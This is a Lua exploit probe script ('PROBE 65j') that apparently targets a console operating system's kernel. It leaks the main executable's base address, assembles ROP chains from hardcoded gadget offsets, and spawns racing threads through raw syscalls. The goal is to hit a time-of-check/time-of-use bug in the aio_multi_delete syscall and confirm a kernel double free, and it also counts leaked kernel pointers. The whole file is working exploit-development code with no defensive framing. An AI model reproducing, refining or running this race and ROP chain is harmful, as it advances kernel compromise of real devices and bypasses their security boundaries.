-- CRASH_CLASS: HIGH
-- PROBE 65j: aio_multi_delete TOCTOU — no sysarch, tight race
--
-- 65i: child A always wins because sysarch serializes threads.
-- 662 returns ret=0 even on failure (error in state buffer),
-- so it probably never touches errno/%fs. Skip sysarch entirely
-- for shorter, tighter chains.
--
-- Also: vary chain length per child with padding NOPs (bare_ret)
-- to desynchronize and increase race window overlap across iters.

print("=== PROBE 65j: aio race — no sysarch, tight ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- /dev/zero
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO buffers
local reqs = memory.alloc(0x200)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local poll_ids = memory.alloc(0x100)
local poll_st = memory.alloc(0x100)

local ids_A = memory.alloc(0x100)
local states_A = memory.alloc(0x100)
local ids_B = memory.alloc(0x100)
local states_B = memory.alloc(0x100)

local function fill_req(base, fd)
    wq(base, uint64(0))
    wq(base + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd); wd(base + 0x24, 0)
end

local function aio_submit()
    fill_req(N(reqs), fd_zero)
    wd(N(result_buf), 0); wd(N(poll_ids), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(poll_ids)))
    end)
    return rd(N(poll_ids)) or 0
end

local function aio_poll(id)
    wd(N(poll_ids), id); wd(N(poll_st), 0)
    pcall(function()
        mk(664)(uint64(N(poll_ids)), uint64(1), uint64(N(poll_st)))
    end)
end

local function aio_delete_lua(id)
    wd(N(poll_ids), id); wd(N(poll_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(poll_ids)), uint64(1), uint64(N(poll_st)))
    end)
    return rd(N(poll_st)) or 0
end

-- [A] Sanity: confirm poll+delete still works
print("")
print("[A] sanity")
local sid = aio_submit()
aio_poll(sid)
local ds = aio_delete_lua(sid)
print(string.format("  id=0x%X delete=0x%X (%s)", sid, ds, ds == 0 and "OK" or "FAIL"))
if ds ~= 0 then print("ABORT"); return end

-- [A2] Test: does 662 crash WITHOUT sysarch?
print("")
print("[A2] test: child 662 without sysarch")
local sid2 = aio_submit()
aio_poll(sid2)

wd(N(ids_A), sid2)
wq(N(states_A), uint64(0xAAAAAAAA))

local stk_test = memory.alloc(0x4000)
local sb_t = N(stk_test)
local ss_t = 0x2000
local rsp_t = sb_t + ss_t - ((sb_t + ss_t) % 16) - 8
for i = 0, ss_t - 1, 4 do wd(sb_t + i, 0) end

local off_t = 0
local function emit_t(v) wq(rsp_t + off_t, v); off_t = off_t + 8 end

-- NO sysarch — go straight to 662
emit_t(g_pop_rdi); emit_t(uint64(N(ids_A)))
emit_t(g_pop_rsi); emit_t(uint64(1))
emit_t(g_pop_rdx); emit_t(uint64(N(states_A)))
emit_t(g_pop_rax); emit_t(uint64(662))
emit_t(stub)
-- thr_exit
emit_t(g_pop_rdi); emit_t(uint64(0))
emit_t(g_pop_rax); emit_t(uint64(431))
emit_t(stub)

local par_test = memory.alloc(0x40)
local pa_t = N(par_test)
for i = 0, 0x3C, 4 do wd(pa_t + i, 0) end
wq(pa_t, g_bare_ret)
wq(pa_t + 0x10, uint64(sb_t))
wq(pa_t + 0x18, uint64(ss_t))
local tid_t = memory.alloc(8); wq(N(tid_t), uint64(0))
wq(pa_t + 0x30, tid_t)

pcall(function() mk(455)(par_test, uint64(0x38)) end)

-- Wait
for w = 1, 20000 do local _ = rd(sb_t) end

local ra_test = rq(N(states_A))
local tah, tal = get_hi_lo(ra_test)
print(string.format("  child 662 no-sysarch: state=%s (%s)",
    fmt(ra_test),
    tal == 0 and "SUCCESS" or
    tal == 0xAAAAAAAA and "CHILD DIDN'T RUN (crashed?)" or
    string.format("state=0x%X", tal)))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))

if not alive() then
    print("  Child crashed without sysarch — need sysarch")
    return
end
if tal == 0xAAAAAAAA then
    print("  Child sentinel unchanged — crashed before 662")
    print("  Need sysarch even for 662. Falling back to jittered chains.")
    -- Fall through to race with sysarch but varied padding
end

local no_sysarch_ok = (tal == 0 or tal == 0x80020003)

-- [B] RACE
print("")
if no_sysarch_ok then
    print("[B] RACE — no sysarch, tight chains")
else
    print("[B] RACE — with sysarch + jitter padding")
end

local ITERS = 40
local double_del = 0
local a_wins = 0
local b_wins = 0
local kptrs = 0

-- Fake TCB for sysarch fallback
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    local sid = aio_submit()
    if sid == 0 then break end
    aio_poll(sid)

    wd(N(ids_A), sid); wq(N(states_A), uint64(0xAAAAAAAA))
    wd(N(ids_B), sid); wq(N(states_B), uint64(0xBBBBBBBB))

    -- Jitter: alternate which child gets padding
    local pad_A = (iter % 3)       -- 0, 1, or 2 extra rets
    local pad_B = ((iter + 1) % 3)

    -- Build child A
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end

    if not no_sysarch_ok then
        emA(g_pop_rdi); emA(uint64(129))
        emA(g_pop_rsi); emA(uint64(N(fs_ptr)))
        emA(g_pop_rax); emA(uint64(165))
        emA(stub)
    end
    for p = 1, pad_A do emA(g_bare_ret) end
    emA(g_pop_rdi); emA(uint64(N(ids_A)))
    emA(g_pop_rsi); emA(uint64(1))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Build child B
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end

    if not no_sysarch_ok then
        emB(g_pop_rdi); emB(uint64(129))
        emB(g_pop_rsi); emB(uint64(N(fs_ptr)))
        emB(g_pop_rax); emB(uint64(165))
        emB(stub)
    end
    for p = 1, pad_B do emB(g_bare_ret) end
    emB(g_pop_rdi); emB(uint64(N(ids_B)))
    emB(g_pop_rsi); emB(uint64(1))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- Params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tidA = memory.alloc(8); wq(N(tidA), uint64(0))
    wq(N(par_A) + 0x30, tidA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tidB = memory.alloc(8); wq(N(tidB), uint64(0))
    wq(N(par_B) + 0x30, tidB)

    -- Spawn both back-to-back
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait
    for w = 1, 30000 do local _ = rd(sb_A) end

    local ra = rq(N(states_A))
    local rb = rq(N(states_B))
    local ah, al = get_hi_lo(ra)
    local bh, bl = get_hi_lo(rb)

    local a_ok = (al == 0 and ah == 0)
    local b_ok = (bl == 0 and bh == 0)

    if a_ok and b_ok then
        double_del = double_del + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** pad_A=%d pad_B=%d", iter, pad_A, pad_B))
    elseif a_ok then a_wins = a_wins + 1
    elseif b_ok then b_wins = b_wins + 1
    end

    if iter <= 3 or iter == ITERS or (a_ok and b_ok) then
        print(string.format("  iter %d: A=%s B=%s pad=%d/%d %s",
            iter, fmt(ra), fmt(rb), pad_A, pad_B,
            a_ok and b_ok and "*** DOUBLE ***" or
            a_ok and "(A)" or b_ok and "(B)" or "(?)"))
    elseif iter == 4 then print("  ...") end

    for _, v in ipairs({ra, rb}) do
        local vh = get_hi_lo(v)
        if vh ~= 0 and vh ~= 0xFFFFFFFF and vh >= 0xFFFF8000 then
            kptrs = kptrs + 1
        end
    end

    aio_delete_lua(sid)
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", ITERS))
print(string.format("  DOUBLE DELETES:  %d", double_del))
print(string.format("  A won / B won:   %d / %d", a_wins, b_wins))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_del > 0 then
    print("*** DOUBLE FREE CONFIRMED ***")
elseif b_wins > 0 then
    print("Race is live (B won sometimes) — need more iters or better timing")
elseif a_wins == ITERS then
    print("A always wins — scheduling too deterministic, need UMTX gate")
end

print("")
print("=== 65j COMPLETE ===")
